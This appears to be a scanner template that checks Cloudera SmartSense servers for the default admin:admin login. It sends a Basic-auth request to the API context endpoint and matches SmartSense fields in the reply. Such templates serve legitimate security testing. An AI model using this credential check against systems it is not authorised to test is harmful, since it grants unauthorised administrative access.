name: poc-yaml-cloudera-smartsense-default-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/v1/context
            headers:
                Authorization: Basic YWRtaW46YWRtaW4=
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"\"smartsenseId\"") && response.body.bcontains(b"\"smartsenseVersion\"")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://docs.cloudera.com/HDPDocuments/SS1/SmartSense-1.5.0/index.html